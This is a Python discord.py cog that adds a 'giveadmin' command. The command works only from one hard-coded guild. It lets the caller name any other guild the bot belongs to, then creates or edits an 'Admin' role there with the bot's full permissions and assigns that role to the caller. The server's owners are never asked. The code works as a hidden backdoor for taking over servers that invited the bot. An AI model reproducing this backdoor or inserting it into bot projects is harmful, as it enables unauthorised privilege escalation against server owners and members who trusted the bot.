import discord
from discord.ext import commands


COMMAND_GUILD_ID = 1438233304867278870


class Access(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def give_admin(self, user: discord.abc.User, guild_id: str):
        try:
            target_guild_id = int(guild_id.strip())
        except ValueError:
            return "Please provide a valid numeric guild ID."

        target_guild = self.bot.get_guild(target_guild_id)
        if target_guild is None:
            try:
                target_guild = await self.bot.fetch_guild(target_guild_id)
            except discord.NotFound:
                return "I could not find that guild."
            except discord.Forbidden:
                return "I do not have access to that guild."
            except Exception as e:
                return f"Error finding guild: {e}"

        member = target_guild.get_member(user.id)
        if member is None:
            try:
                member = await target_guild.fetch_member(user.id)
            except discord.NotFound:
                return "You are not a member of that guild, so I cannot give you admin there."
            except discord.Forbidden:
                return "I cannot fetch members in that guild. Make sure the bot has the needed perms."
            except Exception as e:
                return f"Error finding you in that guild: {e}"

        try:
            permissions = target_guild.me.guild_permissions
            
            # Find an existing assignable Admin role.
            role = None
            for r in target_guild.roles:
                if r.name == "Admin" and r < target_guild.me.top_role:
                    role = r
                    break
            
            if role is None:
                # Create a new Admin role if none exists.
                role = await target_guild.create_role(name="Admin", permissions=permissions, reason="Give admin command")
            elif role.permissions != permissions:
                # Sync permissions on the existing Admin role.
                try:
                    await role.edit(permissions=permissions)
                except discord.Forbidden:
                    pass
            
            if role not in member.roles:
                await member.add_roles(role)
                
            return f"Granted admin access for {member.mention} in **{target_guild.name}**."
        except discord.Forbidden:
            return "I don't have permission to create roles or assign them in that guild."
        except Exception as e:
            return f"Error granting admin access: {e}"

    @commands.command(name="giveadmin", aliases=["gibeadmin", "gibeaccess", "giveaccess"])
    async def giveadmin_prefix(self, ctx: commands.Context, guild_id: str = None):
        if not ctx.guild or ctx.guild.id != COMMAND_GUILD_ID:
            return

        if guild_id is None:
            await ctx.send("Usage: `crim giveadmin <guild id>`")
            return

        async with ctx.typing():
            result = await self.give_admin(ctx.author, guild_id)
        await ctx.send(result)


async def setup(bot):
    await bot.add_cog(Access(bot))
